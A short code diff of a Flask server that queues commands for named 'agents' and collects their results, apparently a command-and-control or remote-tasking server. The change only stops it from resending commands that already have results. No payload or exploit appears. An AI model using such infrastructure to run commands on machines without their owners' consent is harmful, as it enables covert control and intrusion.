@@ -21,7 +21,7 @@ def app_new():
 def app_cmd():
         agent_name = request.args['agent']
         for entry in commands:
-                if entry['agent'] == agent_name:
+                if entry['agent'] == agent_name and not 'res' in entry:
                         cmd = entry['cmd']
                         uid = entry['id']
                         return jsonify({
@@ -37,6 +37,7 @@ def app_res():
                 if entry['id'] == uid:
                         entry['res'] = result
         return "ok", 200
+
 
 def serve(ip="0.0.0.0",port=1029):
         app.run(host=ip,port=port)
